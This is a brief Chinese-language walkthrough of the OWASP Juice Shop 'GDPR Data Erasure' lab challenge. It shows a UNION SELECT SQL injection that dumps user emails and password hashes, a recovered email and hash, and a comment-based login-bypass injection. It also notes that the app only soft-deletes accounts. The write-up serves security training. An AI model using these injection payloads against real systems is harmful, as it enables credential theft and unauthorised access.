- GDPR Data Erasure
    - 描述：使用Chris被删除的用户账户登录。
    - 使用管理员账户登录管理页面未发现 Chris 相关账户
    - 使用 Injection - D3 Database Schema 挑战中的 SQL注入及模式表查询用户表
        - 构建查询
            ```foo')) UNION SELECT username,email,password,deletedAt,1,2,3,4,5 FROM Users--```
        - 从响应中得到邮件地址与密码哈希
            ```
            "chris.pike@juice-sh.op"
            "10a783b9ed19ea1c67c3a27699f0095b"
            ```
        - 使用 SQL 注入登录 ```chris.pike@juice-sh.op'--``` 
    - Juice Shop 的账户删除并非实际从数据库中删除，而仅标记软删除字段